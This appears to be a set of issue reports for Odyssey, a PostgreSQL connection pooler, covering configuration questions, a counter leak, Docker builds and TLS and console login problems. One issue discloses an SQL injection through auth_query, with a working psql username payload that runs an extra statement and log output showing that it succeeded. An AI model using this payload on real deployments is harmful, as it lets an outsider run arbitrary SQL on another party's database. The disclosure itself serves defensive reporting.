title: Get odyssey configuration from CLI
body:
Hi guys,

Is there a way to get the configuration of the current instance of Odyssey without accessing the config file?

```
console=> show config;
ERROR:  odyssey: c4c171e50be88: console command error: show config;
```

Thanks!

Regards, Mikhail

title: Is there any way to specify min connections?
body:
We're troubleshooting an issue right now where we think that occasionally odyssey will initialize a new connection due to load.  Unfortunately, when this happens, the request that caused the connection to initialize is stuck paying the performance penalty of connection startup.

If we configure odyssey for example 20 connections, is there any way to have odyssey open all 20 of them at start so that they are warm?

title: Possible sql injection through auth_query
body:
Suppose we have some config with auth query
```
storage "postgres_server" {
	type "remote"
	host "localhost"
	port 5432
}

database default {
	user default {
		authentication "md5"
		auth_query "SELECT usename, passwd FROM pg_shadow WHERE usename='%u'"
		auth_query_db "postgres"
		auth_query_user "postgres"
		storage "postgres_server"
		storage_db "postgres"

		pool "transaction"
		pool_size 40
		log_debug yes
	}
}
...
```

when if connection like that:
```
$ PGPASSWORD=test psql -U "'; create table test(); select true, '" -p 6432 -h localhost
```

generates this logs output:
```
odyssey_1    | 6 14 May 17:19:47.618 debug [aac0e73595142 s379a20384652] (auth_query) SELECT usename, passwd FROM pg_shadow WHERE usename=''; create table test(); select true, ''
postgres_1   | 2020-05-14 17:19:47.622 UTC [71] LOG:  duration: 4.124 ms  statement: SELECT usename, passwd FROM pg_shadow WHERE usename=''; create table test(); select true, ''

odyssey_1    | 6 14 May 17:19:47.622 info [cf9b8247eb261 none] (auth) user ''; create table test(); select true, '.'; create table test(); select true, '' incorrect password
```

and yes table has been created:
```
$ psql -U postgres -h localhost -c "select from test";
--
(0 rows)
```

title: t-digest for latencies
body:
This algorithm has an experiment proves high efficiency. We can support it to have the ability to calculate quantiles even for high-rate "SELECT 1" queries.
I found only one serious trouble for using it - it doesn't support the calculation of quantiles in the rolling window by default.

But it has a cool property - it's possible to merge t-digests.
So there is a solution:
- store several t-digests
- to get a quantile - merge several t-digests into one, and ask quantile
- to drop old values - drop the oldest t-digest and start a new one

title: Fix leaking routing counter
body:
Under memory pressure Odyssey was leaking routing counter. We have a hard limit of currently routed incoming connections, so they could indefinitely hang.
This could happen when memory allocation failed at specific point quite large number of times (max_routing is 16 * workers).

title: Add psql apt repository to bionic apt repository in Dockerfile
body:
In this Dockerfile, the base image is ubuntu bionic.
I think bionic cannot install `postgresql-server-dev-11` via bionic's standard apt repository(see: [here](https://packages.ubuntu.com/search?suite=default&section=all&arch=any&keywords=postgresql-server-dev&searchon=names)).
And actually, docker build was failed in my local environment because of not locating `postgresql-server-dev-11`.
So, it's need to add psql apt repository in this way.

(cf: https://wiki.postgresql.org/wiki/Apt)

title: More debugging information on SSL_get_verify_result() error
body:
I am getting `SSL_get_verify_result()` when attempting to connect to a TLS-enabled odyssey server (i.e. under the `listen` directive). However, I am failing to understand what is actually being verified on the peer certificate and where should I be looking at.

I get the impression pgbouncer is less strict on certificate validation and therefore is allowing me to continue with a potentially 'bad' certificate, but without more information it's difficult to understand what's the root cause.

Is there anything odyssey can call on openssl beforehand that it can print in order to avoid this rather generic error?

title: Set client_min_messages
body: `od_reset_configure` sets a number of startup parameters out of the box. Is it possible to add custom ones during setup such as `client_min_messages = warning`?

title: Unable to login to console with specific user
body:
There seems to be an issue authenticating to the console which might be affecting other storage access as well.

Using the `default` user config:

```hcl
database "console" {
  user default {
    authentication "scram-sha-256"
    pool "session"
    storage "local"
    password "SCRAM-SHA-256$4096:GLAdwVrwJbBWuelDVpk08A==$gWDLvs77eKR+d+3qvGoUtDvqCLDBxL5MrOpoDD9OBWY=:o0mJmT12PA8A1pCyGtKufaKFVkS6vVgPbb8cTZYNK70="
  }
}
```

```
❯ psql -h 127.0.0.1 -p 6432 -U pgbouncer -d console
Password for user pgbouncer:
psql (12.1, server 9.6.0)
Type "help" for help.

127.0.0.1 pgbouncer@console=> \q
```

Using the specific user with the same config:

```hcl
database "console" {
  user "pgbouncer" {
    authentication "scram-sha-256"
    pool "session"
    storage "local"
    password "SCRAM-SHA-256$4096:GLAdwVrwJbBWuelDVpk08A==$gWDLvs77eKR+d+3qvGoUtDvqCLDBxL5MrOpoDD9OBWY=:o0mJmT12PA8A1pCyGtKufaKFVkS6vVgPbb8cTZYNK70="
  }
}
```

```
❯ psql -h 127.0.0.1 -p 6432 -U pgbouncer -d console
Password for user pgbouncer:
psql: error: could not connect to server: ERROR:  odyssey: c3d64ee2d11a8: password authentication failed
```
